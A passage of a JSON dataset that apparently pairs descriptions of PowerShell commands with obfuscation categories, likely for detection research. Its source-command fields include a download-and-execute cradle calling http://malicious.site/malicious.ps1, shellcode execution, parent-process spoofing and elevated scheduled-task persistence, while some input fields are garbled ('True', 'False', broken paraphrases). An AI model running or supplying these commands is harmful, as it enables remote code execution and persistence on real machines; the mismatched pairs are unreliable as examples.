    "input": ": I believe that this is the best way to This: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": This is the complete paraphrase: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": I believe that this is the best way to This: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": This is the complete paraphrase: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": I believe that this is the best way to This: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Execute shellcode using the Invoke-Shellcode command.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute shellcode using the Invoke-Shellcode command.",
    "origin_cmd": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)"
  },
  {
    "input": "Start a process with specific parameters under a specified parent process.",
    "output": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "- Start a process with specific parameters under a specified parent process.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "paraphrase: Start a process with specific parameters under a specified parent process.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": ".– Use the following paraphrase: a process with specific parameters under a specified parent process .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "Start a process with specific parameters under a specified parent process.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "- Start a process with specific parameters under a specified parent process.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "paraphrase: Start a process with specific parameters under a specified parent process.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": ".– Use the following paraphrase: a process with specific parameters under a specified parent process .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "Start a process with specific parameters under a specified parent process.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "- Start a process with specific parameters under a specified parent process.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "paraphrase: Start a process with specific parameters under a specified parent process.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": ".– Use the following paraphrase: a process with specific parameters under a specified parent process .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "Start a process with specific parameters under a specified parent process.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "- Start a process with specific parameters under a specified parent process.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "paraphrase: Start a process with specific parameters under a specified parent process.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": ".– Use the following paraphrase: a process with specific parameters under a specified parent process .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a process with specific parameters under a specified parent process.",
    "origin_cmd": "Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "Get-Date",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": ". . Retrieve the current date and time.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": ". . Retrieve the current date and time.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": ". . Retrieve the current date and time.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": ". . Retrieve the current date and time.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Retrieve the current date and time.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the current date and time.",
    "origin_cmd": "Get-Date"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new elevated persistence option for a scheduled task to run when the system is idle.",
    "origin_cmd": "$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
